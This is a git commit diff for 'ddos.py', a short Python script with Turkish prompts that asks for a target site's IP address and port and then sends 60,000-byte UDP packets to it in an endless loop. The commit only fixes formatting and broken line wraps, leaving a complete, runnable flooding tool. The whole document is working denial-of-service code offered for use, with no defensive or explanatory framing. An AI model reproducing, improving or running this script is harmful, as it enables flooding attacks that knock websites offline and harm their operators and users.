1ff57a83bc588535bc8d40d509078f22228b6ff2
Homax-Luman <122665117+Homax-Luman@users.noreply.github.com>
2023-01-14 12:29:20 +0400

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -9,24 +9,20 @@ print(" ")
 print("Author --> https://www.instagram.com/weklendy")
 print(" ")
 print(" ")
-target_ip = str(input("Hedef sitenin IP adresi --> "))
+target_ip = str(input("Hedef sitenin IP adresi -->   "))
 print(" ")
 try:
-  target_port = int(input("Port numarası yazın (80) --> "))
+    target_port = int(input("Port numarası girin (80) -->   "))
 except ValueError:
-  print("Yanlıṣ yapdınız !!!")
+    print("Yanlış yapdınız !!!")
 
 bytes = random._urandom(60000)
 
-sock = 
-socket.socket(socket.AF_INET, 
-socket.SOCK_DGRAM)
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
 packega = 0
 
 while True:
-           sock.sendto(bytes,
-       (target_ip, target_port))
-            packega = packega+1
-              print("Number of packages 
-                sent --> %s" %(packega))
+    sock.sendto(bytes, (target_ip, target_port))
+    packega = packega+1
+    print("Number of packages sent -->  %s" %(packega))
